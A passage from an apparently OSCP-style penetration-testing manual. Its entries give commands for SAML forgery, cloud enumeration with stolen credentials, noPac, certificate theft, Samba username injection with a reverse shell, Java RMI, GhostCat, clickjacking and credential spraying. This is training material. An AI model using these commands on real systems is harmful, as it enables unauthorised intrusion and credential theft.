"Change Host / X-Forwarded-Host -> does it reflect (cache/reset), route (SSRF), or gate access? 
-> weaponise the matching bug." One header, several vulns. (See: password-reset-poisoning, 
web-cache-poisoning, ssrf-logic.)

entries.title: SAML attacks — signature wrapping & more
entries.brief: Breaking SAML single sign-on to authenticate as another user
entries.body:
## What SAML is
SAML is XML-based SSO: an **Identity Provider (IdP)** signs an **assertion** (who you are) that 
the **Service Provider (SP)** trusts. The attacks target how the SP **validates that signature** 
and parses the XML. Intercept the base64 `SAMLResponse` in Burp (SAML Raider extension helps).

## The attacks
- **No/unverified signature**: strip the `<Signature>` or change the assertion and see if the SP 
  still accepts it. Some SPs don't verify at all, or only verify when a signature is present -> 
  remove it entirely.
- **XML Signature Wrapping (XSW)**: keep the original signed assertion but add a **second**, 
  attacker-controlled assertion the SP *processes* while validating the signature on the original. 
  You change `NameID` to `admin@corp` in the processed copy. (SAML Raider automates the XSW variants.)
- **XXE / XSLT** in the XML parser (see xxe-logic) — SAML is XML, so classic XML bugs apply to the 
  response.
- **Replay** of a captured assertion (weak/absent `NotOnOrAfter` / one-time checks).
- **Comment injection in NameID**: `admin<!---->@evil.com` — some parsers read it as `admin`, 
  logging you in as admin.
- **Weak IdP signing key** (self-signed / crackable) -> forge your own assertion.

## How to test
Capture the SAMLResponse, decode it, modify the `NameID`/attributes, apply XSW or strip the sig, 
re-encode and send. If the SP accepts it as another user, it's broken.

## Pattern
"Intercept SAMLResponse -> try sig-strip, XSW (second assertion), comment-in-NameID, XXE, replay 
-> authenticate as admin." (See: oauth-saml-flaws, xxe-logic, jwt-attacks-advanced.)

entries.title: GCP enumeration with stolen credentials
entries.brief: Turning a leaked service-account key or token into recon in Google Cloud
entries.body:
## You have creds — what kind
GCP creds come as a **service-account JSON key**, a **gcloud refresh token**, or an **OAuth access token**
(from the metadata server on a GCE box). Activate them, confirm identity, enumerate.

## 1. Authenticate + whoami
    gcloud auth activate-service-account --key-file=key.json      # SA key
    gcloud config set project <PROJECT>
    gcloud auth list ; gcloud config list ; gcloud projects list   # who/where am I
On a GCE VM, pull a token from the metadata server (cloud-metadata-ssrf, GCP flavour):
    curl -H 'Metadata-Flavor: Google' \
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'

## 2. Enumerate what the identity can touch
    gcloud projects get-iam-policy <PROJECT>          # roles/bindings (your privileges)
    gcloud compute instances list                     # VMs (+ startup scripts can hold secrets)
    gsutil ls ; gsutil ls -r gs://<bucket>             # storage buckets
    gcloud secrets list ; gcloud secrets versions access latest --secret=<name>
    gcloud iam service-accounts list ; gcloud functions list ; gcloud container clusters list
Instance **startup-script** metadata and Secret Manager are the usual credential troves.

## 3. Privilege escalation & lateral
- **actAs / service-account impersonation**: `gcloud ... --impersonate-service-account=<SA>` if you 
  hold `iam.serviceAccountTokenCreator` over a more-privileged SA.
- **Run on a VM**: set a startup script or SSH key via `compute instances add-metadata` if allowed.
- **GKE**: `gcloud container clusters get-credentials` -> kubectl (kubernetes-attacks).
**ScoutSuite** audits the project; many GCP privesc paths are IAM-role misconfigurations.

## Pattern
"Activate creds -> get-iam-policy + list compute/storage/secrets -> loot startup scripts + Secret 
Manager -> impersonate a better SA / run on a VM / jump to GKE." (See: aws-enumeration, 
azure-entra-basics, cloud-metadata-ssrf.)

entries.title: Mail services — SMTP / POP3 / IMAP
entries.brief: Enumerating and looting the mail trio and the creds they leak
entries.body:
## The ports
**SMTP** 25/465/587 (send), **POP3** 110/995 (retrieve), **IMAP** 143/993 (retrieve). The retrieval 
services are where **mailbox contents and creds** live once you have a username/password.

## SMTP (25) — user enumeration + relay
    nmap -p25 -sV --script smtp-commands,smtp-open-relay,smtp-enum-users <TARGET>
    # manual user enum:
    nc <TARGET> 25   then:  VRFY root   ·   EXPN admin   ·   RCPT TO:<user@domain>
    smtp-user-enum -M VRFY -U users.txt -t <TARGET>
Open relay -> phishing (email-spoofing-checks); valid users -> spray the retrieval services.

## POP3 (110/995)
    nc <TARGET> 110   then:  USER bob   PASS secret   LIST   RETR 1   (read messages)
    # TLS:  openssl s_client -connect <TARGET>:995
Mailboxes hold password-reset links, internal creds, and VPN/wifi details.

## IMAP (143/993)
    openssl s_client -connect <TARGET>:993
    a LOGIN bob secret   ·   a LIST "" "*"   ·   a SELECT INBOX   ·   a FETCH 1 BODY[]
IMAP keeps folders server-side — search Sent/Drafts/Archive for secrets.

## Then
Brute with hydra (`hydra -L u -P p pop3://<T>` / `imap://`), reuse found creds elsewhere, and read 
the mail for the next credential or a password-reset you can trigger.

## Pattern
"SMTP VRFY/RCPT for users + relay check -> spray POP3/IMAP -> read mailboxes for creds and reset 
links -> reuse." (See: smtp-enum, email-spoofing-checks, creds-hunting.)

entries.title: MSRPC enumeration with rpcclient
entries.brief: Pulling users, groups, policy and SIDs from a Windows host over RPC (135/445)
entries.body:
## What rpcclient gives you
Over **MSRPC** (endpoint mapper 135, or named pipes on 445), `rpcclient` queries a Windows host's 
SAM/LSA — users, groups, the password policy, and SID<->name mappings — often with just a 
**null session** or any domain credential.

## Connect
    rpcclient -U '' -N <TARGET>            # null session
    rpcclient -U 'domain/user%pass' <TARGET>

## The useful commands (inside rpcclient)
    srvinfo                      # OS/version, server type
    enumdomusers                 # all users (name + RID)
    enumdomgroups ; querygroupmem <rid>      # groups and membership
    queryuser <rid>              # a user's details (last logon, flags, description)
    getdompwinfo                 # password policy (min length, complexity)
    lsaquery                     # domain name + SID
    lookupnames administrator    # name -> SID   ;   lookupsids <SID> for the reverse
    enumdomains ; enumprinters ; netshareenumall   # domains, printers, shares

## RID cycling (names without enumdomusers)
When `enumdomusers` is blocked, walk RIDs from the domain SID:
    lookupsids <DOMAIN-SID>-500 ... -1100        # or use impacket-lookupsid / nxc --rid-brute
500 = Administrator, 512 = Domain Admins; the names feed spraying and roasting.

## Pattern
"rpcclient null/auth -> enumdomusers/groups + getdompwinfo + lsaquery -> a user list + policy -> 
feed spraying/roasting." (See: ad-enum-without-creds, smb-enumeration-checklist, ad-password-policy.)

entries.title: Reading gMSA & LAPS passwords
entries.brief: Recovering service-account and local-admin passwords you're authorised to read
entries.body:
## Two managed-password features, same win
AD can store passwords and hand them only to principals with the right to read them. If a BloodHound 
edge (or an ACL) gives **you** that right, you read a high-value password directly — no cracking.

## LAPS — local administrator password
LAPS stores each machine's randomized local-admin password in AD. If you can read the attribute 
(`ms-Mcs-AdmPwd` for legacy LAPS, or the encrypted Windows-LAPS attribute):
    nxc ldap <DC> -u user -p pass --laps                  # dump readable LAPS passwords
    pyLAPS.py --action get -d corp.local -u user -p pass
    # or LDAP:  (ms-Mcs-AdmPwd)  via ldapsearch/windapsearch/ldeep
That local-admin password -> admin on that host -> lsass/SAM dump -> lateral movement.

## gMSA — Group Managed Service Account
A gMSA's password is computed from a blob (`msDS-ManagedPassword`) readable by principals in its 
`PrincipalsAllowedToRetrieveManagedPassword`. Read it -> NT hash (no cracking):
    gMSADumper.py -u user -p pass -d corp.local          # -> NT hash + aes keys
    nxc ldap <DC> -u user -p pass --gmsa
gMSAs often run services with privilege -> pass-the-hash / Kerberos as that account.

## Find the right to read
BloodHound: `ReadLAPSPassword` / `ReadGMSAPassword` edges to a computer / gMSA. Enumerate with 
pywerview/ldeep (adminCount, the managed-password attributes).

## Pattern
"Hold ReadLAPS/ReadGMSA over a target -> read ms-Mcs-AdmPwd / msDS-ManagedPassword -> local-admin 
password or gMSA hash -> move laterally." A read-right win, not an exploit. (See: windows-gpp-laps, 
ad-acl-abuse, pass-the-hash-ticket.)

entries.title: noPac / sAMAccountName spoofing (CVE-2021-42278/42287)
entries.brief: How two Kerberos flaws let any domain user impersonate a DC and become Domain Admin
entries.body:
## The two bugs that chain
- **CVE-2021-42278** — AD didn't enforce that a **computer** account's name ends in `$`, so you can
  rename a machine account you control to match a **DC's** name (e.g. `DC01`).
- **CVE-2021-42287** — when a TGT's account isn't found, the KDC appends `$` and looks again, so your
  renamed `DC01` account gets a ticket **as the real DC01$**.
Chained: a standard domain user creates/renames a computer, requests tickets, and ends up with a
service ticket **as a Domain Controller** → impersonate Administrator → DCSync the domain.

## Precondition
Any valid **domain user**, the default **MachineAccountQuota > 0** (you can add a computer), and an
**unpatched** DC (pre-Nov-2021).

## Exploit (one-shot tools)
    # noPac / sam_the_admin automate: addcomputer -> rename -> S4U -> secretsdump/shell
    noPac.py corp.local/user:pass -dc-ip <DC> -dc-host DC01 --impersonate administrator -use-ldap \
      -dump                                   # DCSync-style dump
    noPac.py corp.local/user:pass -dc-ip <DC> -dc-host DC01 --impersonate administrator -use-ldap \
      -shell                                  # SYSTEM shell on the DC
Manual path: `impacket-addcomputer` -> `renameMachine.py` (name = `DC01`) -> `impacket-getST -self
-impersonate administrator` -> use the ccache with secretsdump/psexec.

## Pattern
"Add a computer -> rename it to a DC's name (42278) -> request a ticket that resolves to the DC$
(42287) -> S4U as Administrator -> DCSync/SYSTEM." (See: dcsync-dcshadow, rbcd-attack,
golden-silver-tickets.)

entries.title: ADCS certificate theft (THEFT1-5)
entries.brief: Stealing existing certificates and keys for durable, password-proof access
entries.body:
## Why steal certs (vs ESC abuse)
Separate from the ESC misconfigurations (adcs-esc-attacks), you can **steal certificates that already exist**.
A user/computer cert is a credential that survives password resets and enables
PKINIT auth — excellent persistence and lateral movement. Certify/Certipy label these **THEFT1-5**.

## The techniques
- **THEFT1 — export from the user store**: with code exec as a user, export their cert + private key
  (if exportable):  `certipy ... ` / mimikatz `crypto::certificates /export`.
- **THEFT2 — DPAPI-protected keys**: non-exportable keys are still recoverable via DPAPI (the
  masterkey), then rebuilt into a PFX. (See: dpapi-secrets.)
- **THEFT3 — machine certificates**: as SYSTEM, export the computer's cert/key -> authenticate as the
  machine account.
- **THEFT4 — find PFX/certs on disk/shares**: hunt `*.pfx`, `*.p12`, exported certs in shares, backups,
  user folders (often with the password nearby).
- **THEFT5 — request on behalf via a stored key / NTLM->PKINIT** to obtain a usable cert.

## Use the stolen cert
    certipy auth -pfx stolen.pfx -dc-ip <DC>        # PKINIT -> TGT + the account's NT hash
    export KRB5CCNAME=...; impacket-secretsdump -k -no-pass ...
A PFX = log in as that principal whenever you like, until the cert expires or is revoked.

## Pattern
"Find/export an existing cert+key (store / DPAPI / disk / machine) -> certipy auth -> TGT + NT hash."
Durable because certs outlive passwords. (See: adcs-esc-attacks, shadow-credentials-attack,
dpapi-secrets.)

entries.title: AD ACL edges — which edge, which tool
entries.brief: A lookup from a BloodHound write-privilege edge to the exact command that abuses it
entries.body:
## The idea
BloodHound shows **who can do what to whom**. Each dangerous edge has a specific abuse. This is the
edge → technique → oscp pointer map, so you go straight from the graph to the command.

## Over a USER
| Edge | What it grants | Do |
| --- | --- | --- |
| ForceChangePassword | reset their password | `oscp atlas impacket-changepasswd` (-reset) |
| GenericAll / GenericWrite | full/write over the user | targeted Kerberoast OR shadow creds |
| AddKeyCredentialLink | add a cert key → auth as them | `oscp manual show shadow-credentials-attack` |
| (write servicePrincipalName) | make them roastable | `oscp manual show targeted-kerberoast` |

## Over a COMPUTER
| Edge | Do |
| --- | --- |
| GenericAll / GenericWrite / WriteProperty | RBCD: `oscp manual show rbcd-attack` |
| AddKeyCredentialLink | shadow creds → the machine's hash |
| ReadLAPSPassword | read local-admin pw: `oscp manual show gmsa-laps-reading` |

## Over a GROUP
| Edge | Do |
| --- | --- |
| AddMember / GenericWrite | add yourself to the group (`net group`, `bloodyAD add groupMember`) |
| (if group is privileged) | → the group's rights (e.g. Backup Operators, DnsAdmins) |

## Generic / structural
| Edge | Do |
| --- | --- |
| WriteDacl | grant yourself more rights: `oscp atlas dacledit` (then abuse) |
| WriteOwner | take ownership → WriteDacl: `oscp atlas owneredit` |
| GetChanges + GetChangesAll (DCSync) | `oscp manual show dcsync-dcshadow` |
| ReadGMSAPassword | `oscp atlas gMSADumper` |

## Pattern
"Read the edge in BloodHound -> find its row above -> run that tool. WriteOwner→WriteDacl→(grant
GenericAll)→shadow-creds/RBCD is the classic chaining ladder." (See: ad-acl-abuse,
shadow-credentials-attack, rbcd-attack, targeted-kerberoast.)

entries.title: Java RMI / JMX (1099, 1098, random) exploitation
entries.brief: Turning an exposed Java remote-management service into code execution
entries.body:
## What's exposed
Java apps expose **RMI registries** (often 1099) and **JMX/MBean servers** (1099, 9010, 11099,
or random high ports). When unauthenticated — common — they allow **loading a remote class** or
invoking MBeans that run code. A frequent OSCP/enterprise foothold on Java boxes.

## 1. Enumerate
    nmap -p1099,1098,9010,11099 -sV --script rmi-dumpregistry <TARGET>
    BaRMIe -enum <TARGET> 1099          # enumerate RMI objects + known attacks
`rmi-dumpregistry` lists bound objects; look for JMX connectors and app services.

## 2. JMX without auth → RCE
An unauthenticated JMX service lets you create an **MLet** MBean that loads a malicious MBean from
your HTTP server, giving code execution:
    msfconsole -> use exploit/multi/misc/java_jmx_server       # automates the MLet attack
    # or jmxterm to interact and invoke MBeans manually:
    echo 'open <TARGET>:1099' | java -jar jmxterm.jar          # then: beans / run ...

## 3. RMI deserialization
RMI endpoints deserialize Java objects → ysoserial gadget chains = RCE (see java-deserialization):
    BaRMIe -attack <TARGET> 1099
    java -jar ysoserial.jar CommonsCollections5 'cmd' | <deliver to the RMI call>

## Pattern
"nmap rmi-dumpregistry / BaRMIe -enum -> unauth JMX? MLet RCE (msf/jmxterm) -> else RMI deser with
ysoserial." (See: java-deserialization, tomcat-exploitation, jenkins-exploitation.)

entries.title: Samba exploitation (Linux SMB)
entries.brief: The SMB bugs specific to Samba on Linux, distinct from Windows EternalBlue
entries.body:
## Fingerprint Samba (not Windows)
`nmap -p445 -sV` showing `Samba smbd x.y.z` means a **Linux** SMB server. The exploits differ from
Windows (no EternalBlue); match the Samba **version** to its CVEs.

## The classic version-matched bugs
- **CVE-2007-2447 — usermap script (Samba 3.0.20-3.0.25rc3)**: command injection via the username in
  the "map to guest" script path. Unauthenticated RCE as root; a metasploit one-liner, or by hand:
      smbclient //<TARGET>/share -U "./=`nohup <revshell>`"      # username carries the injection
      # msf: exploit/multi/samba/usermap_script
- **CVE-2017-7494 — SambaCry / is_known_pipename (3.5.0-4.4.14/4.5.10/4.6.4)**: upload a shared
  object to a writable share, then make the server load it via a named pipe → RCE.
      # needs a writable share + its filesystem path; msf: exploit/linux/samba/is_known_pipename
- Older: **CVE-2015-0240** (smbd TALLOC), trans2 bugs.

## Enumerate first (shares often leak enough)
    nxc smb <TARGET> -u '' -p '' --shares ; smbmap -H <TARGET>
    enum4linux-ng -A <TARGET>
Writable shares (needed for SambaCry) and readable configs/creds may win without an exploit.

## Pattern
"Samba banner -> version -> usermap_script (unauth root on very old) / is_known_pipename (writable
share) -> else loot shares + reuse creds." (See: smb-enumeration-checklist, eternalblue-ms17010,
msrpc-rpcclient-enum.)

entries.title: Tomcat AJP GhostCat (CVE-2020-1938)
entries.brief: Reading app files (and sometimes RCE) through an exposed AJP connector
entries.body:
## The service
Tomcat ships an **AJP connector** (default port **8009**) for proxied access. When it's exposed and
unpatched, **GhostCat** lets an attacker use AJP attributes to make Tomcat **read or include** files
from the web app — leaking `WEB-INF/web.xml` and configs (creds!), and, if the app allows file upload,
escalating to **RCE** by including an uploaded file as a JSP.

## Detect
    nmap -p8009 -sV <TARGET>        # "ajp13" / Apache Jserv -> AJP present
    # 8080 (HTTP) often sits alongside; GhostCat targets 8009.

## Exploit
    # file read (leaks WEB-INF, config, creds):
    python3 ghostcat.py -p 8009 -f WEB-INF/web.xml <TARGET>
    # or metasploit: auxiliary/admin/http/tomcat_ghostcat
    # RCE (if you can upload a file anywhere in the webroot):
    #   upload <jsp payload> as e.g. an avatar, then GhostCat-include it as a JSP
Read `web.xml` first — it frequently reveals the Tomcat manager creds, which gives a cleaner RCE via
a malicious WAR (tomcat-exploitation).

## Pattern
"Port 8009 open -> GhostCat read WEB-INF/web.xml for creds -> manager WAR deploy for RCE (or include
an uploaded JSP)." (See: tomcat-exploitation, file-read-primitives, file-upload-bypass.)

entries.title: Clickjacking (UI redressing)
entries.brief: Tricking a user into clicking a sensitive action framed invisibly
entries.body:
## The mechanism
If a sensitive page can be **framed**, an attacker overlays it invisibly (`opacity:0`) above
decoy content, so the victim's click actually lands on the framed app's button — "delete account",
"authorise", "transfer". It needs an action that is **one click** and **state-changing**, with the
victim already authenticated.

## When it's possible
The target response lacks frame protections:
- No `X-Frame-Options: DENY/SAMEORIGIN`, and
- No `Content-Security-Policy: frame-ancestors 'self'` (or none).
Check the response headers; if both are absent, the page is framable.

## Proof-of-concept
    <style>iframe{opacity:0;position:absolute;top:0;left:0;width:1000px;height:800px}</style>
    <button>Click to win!</button>                 <!-- decoy, positioned under the real button -->
    <iframe src="https://target/account/delete"></iframe>
Align the invisible iframe so the real "confirm" button sits on the decoy.

## Variants
- **Drag-and-drop** to exfiltrate data across frames; **clickjacking a CSRF** form; stacking to defeat
  simple frame-busting JS.

## Impact & note
Usually medium (needs user interaction and a one-click sensitive action). Often reported alongside a
missing CSRF token. (See: csrf, cors-misconfig.)

## Pattern
"No X-Frame-Options / frame-ancestors -> frame the one-click action invisibly over a decoy -> victim's
click confirms it."

entries.title: TFTP (69/udp) enumeration
entries.brief: Reading and writing files on a trivial, authentication-free file service
entries.body:
## The service
**TFTP** on **UDP 69** has **no authentication**. If you can guess or know filenames, you read them;
if the server allows writes, you upload — occasionally straight into a webroot or a config path.
Common on routers, PXE/boot servers, VoIP phones and printers.

## Detect
    sudo nmap -sU -p69 -sV <TARGET>
    nmap -sU -p69 --script tftp-enum <TARGET>       # tries a list of common filenames

## Interact
    tftp <TARGET>
    tftp> get <filename>            # e.g. startup-config, running-config, pxelinux.cfg/default
    tftp> put shell.php             # if writes are allowed (and you know the served dir)
    # one-liners:
    curl -s tftp://<TARGET>/<file> -o out
Guess config/boot files: `*.conf`, `startup-config`, `running-config`, `/etc/passwd` (long shot),
`web.config`, firmware images, PXE configs (which leak install creds).

## Why it matters
Router/switch configs hold **cleartext or weak-hashed credentials** and SNMP strings; PXE configs
leak domain-join creds. A writable TFTP mapped to a web/boot path = code execution.

## Pattern
"nmap -sU tftp-enum -> get config/boot files for creds -> if writable + a known served path, put a
webshell." (See: snmp-enum, legacy-services, file-read-primitives.)

entries.title: API security testing (OWASP API Top 10)
entries.brief: The bug classes specific to REST/JSON APIs and how to test each
entries.body:
## Why APIs need their own checklist
APIs expose objects and actions directly, often with thin server-side checks because "the client
enforces it." The OWASP API Top 10 names the recurring issues. Map the API first
(oscp manual show api-and-graphql), then test each class below.

## The headline classes
- **BOLA / IDOR (API1)** — Broken Object Level Authorization: change an id (`/api/orders/1001` ->
  `1002`, a UUID, a username) to read/modify another user's object. The #1 API bug.
  (oscp manual show idor-access-control.)
- **Broken authentication (API2)** — weak JWT (oscp manual show jwt-attacks-advanced), tokens that
  don't expire, credential stuffing, no lockout.
- **BOPLA / mass assignment (API3)** — add fields the UI never sends (`"role":"admin"`,
  `"isVerified":true`), or read fields the response over-exposes (excessive data exposure).
  (oscp manual show mass-assignment.)
- **BFLA (API5)** — Broken Function Level Authorization: call an **admin endpoint** or a
  different **method** directly (`DELETE /api/users/5`, `/api/admin/...`) that the UI hides.
  (oscp manual show http-verb-tampering.)
- **Resource consumption (API4)** — no rate limiting / pagination limits -> brute force, scraping, DoS.
- **SSRF (API7)** — URL fields that the server fetches (oscp manual show ssrf-logic).

## How to test
1. **Capture the real calls** (proxy the app) and read the JS for hidden endpoints
   (oscp methods show attack-spa-react).
2. **Enumerate** endpoints/params (oscp atlas kiterunner, arjun).
3. For each object endpoint: swap ids (BOLA), add fields (mass assignment), change the method/path
   (BFLA), and omit/alter the auth token.
4. Use two accounts (A/B) to prove cross-user access cleanly.

## Pattern
"Map the API -> for every endpoint test BOLA (swap ids), BFLA (hit admin/other methods), mass
assignment (extra fields), auth weaknesses, and SSRF." (See: idor-access-control, mass-assignment,
api-and-graphql.)

entries.title: Predictable tokens & weak randomness
entries.brief: When session ids, reset tokens and CSRF tokens can be guessed or forged
entries.body:
## Why it matters
Security tokens must be **unpredictable**. When they're derived from time, a counter, a hash of
known data, or a weak PRNG, an attacker can **predict or forge** them — taking over sessions,
resetting others' passwords, or bypassing CSRF.

## What to inspect
- **Session ids**: collect several (register/login repeatedly). Are they sequential, short, or
  structured (base64 that decodes to `userid:timestamp`)? Low entropy -> brute/predict.
- **Password-reset tokens**: are they `md5(email)`, `md5(time())`, sequential, or reused? Request
  tokens for accounts you control, look for a pattern, then predict the victim's.
  (oscp manual show password-reset-poisoning.)
- **CSRF tokens**: static, per-app (not per-session), or predictable -> CSRF protection is defeated.
- **API keys / "remember me" / invite tokens**: same analysis.
- **JWT**: a guessable/weak HMAC secret is forgeable (oscp manual show hash-length-extension,
  jwt-attacks-advanced).

## Tells of weak generation
Tokens that are short, all-numeric, incrementing, or decode to readable fields; values that **repeat**
across users/sessions; timestamps embedded in them (brute a small time window).

## Testing
Gather many tokens, decode (base64/hex), diff them, and look for structure or correlation with
inputs (email, time, userid). If you can model it, you can forge the next one.

## Pattern
"Collect many tokens -> decode + diff -> find structure (time/counter/hash of known data) -> predict
or forge the target's." (See: cookies-sessions-jwt, password-reset-poisoning, web-auth-bypass.)

entries.title: Session management flaws
entries.brief: Fixation, weak expiry, and logout/lifecycle issues that keep sessions alive
entries.body:
## The lifecycle to attack
A session id is a bearer credential. Bugs appear across its lifecycle: how it's **issued**, whether
it **rotates**, how long it **lives**, and whether it's truly **killed** on logout.

## The flaws
- **Session fixation**: the app keeps the **same** session id after login. Attacker sets a known id
  in the victim's browser (via a link/param/subdomain cookie), victim logs in, attacker reuses that
  id -> logged in as them. Fix/finding: the id must **rotate on authentication**.
- **No/weak expiry**: tokens valid for days/forever, or idle timeout missing -> a stolen/old token
  keeps working.
- **Broken logout**: logout clears the cookie **client-side** but the id is still **valid server-side**
  -> replay a captured token after "logout".
- **Concurrent sessions / no invalidation**: password change or logout doesn't kill **other**
  sessions; a stolen token survives a password reset.
- **Cookie flags**: missing `HttpOnly` (XSS can steal it), `Secure` (sent over HTTP), or `SameSite`
  (CSRF). (oscp manual show cookies-sessions-jwt.)
- **Scope too broad**: cookie set on `.example.com` leaks to untrusted subdomains.

## How to test
Capture a session id, log out (or change the password), and **replay** it — still works = broken
invalidation. Log in twice and compare ids for fixation. Inspect Set-Cookie for the flags.

## Pattern
"Does the id rotate on login (fixation)? expire? die server-side on logout/password-change? carry
HttpOnly/Secure/SameSite? -> replay to prove it." (See: cookies-sessions-jwt, predictable-tokens,
csrf.)

entries.title: Business logic flaws
entries.brief: Abusing the intended workflow when each step is 'allowed' but the sequence isn't
entries.body:
## What they are
Not a payload — a **misuse of legitimate functionality**. Every request is technically valid, but
the application trusts an order, a value, or a constraint it never enforces server-side. Scanners
miss these; you find them by understanding what the app is *for*.

## Common patterns
- **Negative / overflow quantities & prices**: buy `-1` items for a refund; a huge quantity overflows
  a total; apply a coupon many times; change a price the client sends.
- **Skipping steps**: jump straight to the "confirmed/paid" endpoint, bypassing payment or a
  verification step (forced browsing of the workflow).
- **Parameter tampering on trust**: the client sends `price`, `discount`, `isAdmin`, `accountId`,
  `balance` and the server trusts it (overlaps mass-assignment).
- **Race conditions**: redeem a one-time coupon / withdraw funds twice by sending requests in
  parallel. (oscp manual show race-conditions.)
- **Abusing limits**: no cap on transfers, votes, password attempts, or referrals -> value extraction.
- **Inconsistent validation**: a rule enforced in one path but not another (mobile API vs web).

## How to find them
Map the intended flow, then ask at each step: "what if I change this value, skip this, repeat this,
do it out of order, or do it as another user?" Use two accounts and compare.

## Pattern
"Understand the workflow -> at each step try: tamper the value, skip/replay/reorder, go negative,
exceed the limit, or race it -> the app allowed each request but not the outcome." (See:
mass-assignment, race-conditions, idor-access-control.)

entries.title: Information disclosure & verbose errors
entries.brief: Mining error messages, debug endpoints and leaked files for the next step
entries.body:
## Why it's step zero for exploitation
Leaked internals turn blind guessing into targeted attacks: a stack trace reveals the framework and
file paths (for LFI/RCE), a `.env` hands you DB/cloud creds, a source map rebuilds the front-end.
Hunt these early and after every error you can trigger.

## Where to look
- **Verbose errors / stack traces**: force errors (bad input, wrong type, `'`) -> framework,
  versions, file paths, SQL fragments. Debug mode on (Flask/Django/Rails/Symfony) can even give an
  interactive console = RCE.
- **Leaked files**: `/.env`, `/.git/` (oscp manual show git-exposure), `config.php.bak`, `web.config`,
  `backup.zip`, `*.swp/~`, `/phpinfo.php`, `/server-status`, `/actuator/*` (Spring),
  `/.well-known/`, source maps (`.js.map`).
- **Headers & comments**: `Server`, `X-Powered-By`, `X-Debug`, internal IPs in headers; HTML/JS
  comments with endpoints, creds or TODOs.
- **Enumeration oracles**: different responses for valid vs invalid usernames (user enumeration),
  timing differences, verbose auth errors.
- **Directory listing** enabled -> browse everything.

## How
Fuzz for the files (oscp atlas feroxbuster/dirsearch with bak/old/zip/env extensions), trigger errors
deliberately, read every response header and the page source, and grab JS + source maps.

## Pattern
"Trigger errors + fuzz for leaked files (.env/.git/backups/source maps) + read headers/comments ->
feed the framework/paths/creds into the real exploit." (See: web-enum-checklist, git-exposure,
web-source-review.)

entries.title: Public cloud storage buckets
entries.brief: Finding and reading exposed S3 / Azure Blob / GCS storage
entries.body:
## The exposure
Cloud object storage is frequently left **world-readable** (or listable), spilling backups, source,
customer data and credentials. Discovery is name-guessing + a permissions check across the three
providers.

## Guess the names
Bucket/container names are often `<company>`, `<company>-backups`, `<app>-assets`, `dev-<x>`,
`<company>-prod`. Build a list from the org name, subdomains, and words seen in the app, then check:
    # AWS S3
    aws s3 ls s3://<bucket> --no-sign-request            # anonymous list
    curl -s https://<bucket>.s3.amazonaws.com/           # list via HTTP (XML)
    # GCS
    gsutil ls -r gs://<bucket>                           # (or curl the storage.googleapis.com URL)
    # Azure Blob
    curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
Tools automate guessing + checking: `oscp atlas cloud_enum` (all three), `oscp atlas s3scanner` (S3).

## What to pull + check
List, then download interesting objects (backups, `.sql`, `.env`, `config`, keys). Also test
**write** (anonymous upload) — a writable bucket serving a website = defacement or stored XSS/RCE.
A bucket referenced by the app (an asset URL) names the account; permutate from there.

## Then
Creds found in a bucket -> use them (aws-enumeration / gcp-enumeration / azure-entra-basics). Buckets
are a common first cloud foothold.

## Pattern
"Guess bucket names from the org/app -> anonymous list + read (and test write) across S3/GCS/Blob ->
loot backups/configs/keys -> pivot into the account." (See: aws-enumeration, gcp-enumeration,
cloud-metadata-ssrf.)

entries.title: Credential reuse strategy
entries.brief: Every credential you find is a key to try on every lock — systematically
entries.body:
## The principle
Passwords, hashes and keys get REUSED across users, hosts, and services. One found credential is
rarely scoped to where you found it — try it everywhere, every protocol.

## Keep a creds table (in your notes)
    credential            | source            | works on
    Summer2025!           | web config        | ? SMB ? SSH ? WinRM ? RDP ? mail ? DB
    aad3b...:<NThash>     | SAM dump host A   | ? other hosts (PtH) ? --local-auth
    id_rsa                | /home/dev/.ssh    | ? other users ? other hosts

## Spray each credential across protocols
    nxc smb HOSTS -u user -p 'Pass' --local-auth        # and winrm/rdp/mssql/ssh variants
    nxc ssh HOSTS -u user -p 'Pass' ; hydra for others
    # hash -> pass-the-hash everywhere (see pass-the-hash)
    # ssh key -> try every user@every host (see ssh-key-reuse)

## Also mutate
    - username == password; Password+1; Season+Year; company name variants
    - a local admin hash from one box is the classic key to the whole subnet

## Gotchas
- Mind lockout when spraying passwords (not an issue for PtH/keys) — see password-spraying-ad.
- Re-run reuse checks after EACH new credential — it compounds.
- This single habit cracks most AD/lab networks open.

entries.title: Looting SMB shares for secrets
entries.brief: Systematically searching file shares for the credentials that unlock the network
entries.body:
## Why shares are gold
File shares accumulate scripts, configs, backups and documents full of **passwords and keys**. Once
you have any credential, enumerate every share you can read and grep it — this is often where the
next (privileged) credential comes from.

## 1. Map what you can read
    nxc smb <targets> -u user -p pass --shares         # readable/writable shares per host
    smbmap -H <target> -u user -p pass -R              # recursive listing
    smbclient //<target>/<share> -U 'user%pass'        # browse/mget interactively
Prioritise SYSVOL/NETLOGON (scripts, GPP), IT/admin/backup shares, and user home directories.

## 2. Spider + grep at scale
Manually browsing is slow; use a share spider that flags sensitive content:
    manspider <target> -u user -p pass -f password secret cred config    # filenames/content
    # snaffler (Windows) classifies finds by how juicy they are
Look for: `*.ps1 *.bat *.vbs` (hardcoded creds), `web.config *.config appsettings.json`, `.kdbx`
(KeePass -> keepass2john), `unattend.xml sysprep.inf`, `.ppk id_rsa`, `*.vmdk`, `password` in docs.

## 3. GPP cpassword (classic SYSVOL find)
Old Group Policy Preferences stored an AES-encrypted password with a public key:
    # find Groups.xml in SYSVOL, then:
    gpp-decrypt <cpassword>            # oscp atlas gpp-decrypt
(See: windows-gpp-laps.)

## Pattern
"With any creds -> --shares to see what you can read -> spider + grep for password/secret/config/key
files -> decrypt GPP/KeePass -> reuse the creds you find (credential-reuse-strategy)." (See:
creds-hunting, smb-enumeration-checklist, windows-gpp-laps.)

entries.title: proxychains on macOS (SIP, config, browser & Burp)
entries.brief: Exact install/config and the SIP gotcha that stops system binaries working
entries.body:
## Why macOS is different (SIP)
proxychains works by injecting a library into a program (DYLD_INSERT_LIBRARIES) so its TCP calls
go through the proxy. macOS **System Integrity Protection (SIP)** strips that variable for
**protected binaries** — anything under /bin, /usr/bin, /sbin, /System. So `proxychains4 curl`
using the system `/usr/bin/curl` silently does nothing. The fix: run **non-protected** binaries
(Homebrew tools), or skip proxychains for things with native proxy support (browsers, Burp).

## 1. Install (Homebrew)
    brew install proxychains-ng
The binary is **proxychains4**. Config lives at (Apple Silicon) /opt/homebrew/etc/proxychains.conf,
or (Intel) /usr/local/etc/proxychains.conf.

## 2. Stand up a SOCKS proxy to point at
